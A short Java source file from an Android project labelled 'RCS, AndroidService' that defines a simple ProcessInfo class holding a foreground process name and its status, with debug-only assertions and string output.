/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ProcessInfo.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo;

import java.util.Collection;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class ProcessInfo {
	public String processInfo;
	public ProcessStatus status;

	public ProcessInfo(String currentForeground, ProcessStatus status) {
		if (Cfg.DEBUG) { Check.asserts(currentForeground != null, " (ProcessInfo) Assert failed, currentForeground = null"); }
		this.processInfo = currentForeground;
		this.status = status;
	}
	
	@Override
	public String toString(){
		if(Cfg.DEBUG){
			return processInfo + " : " + status;
		}else{
			return super.toString();
		}
	}
}
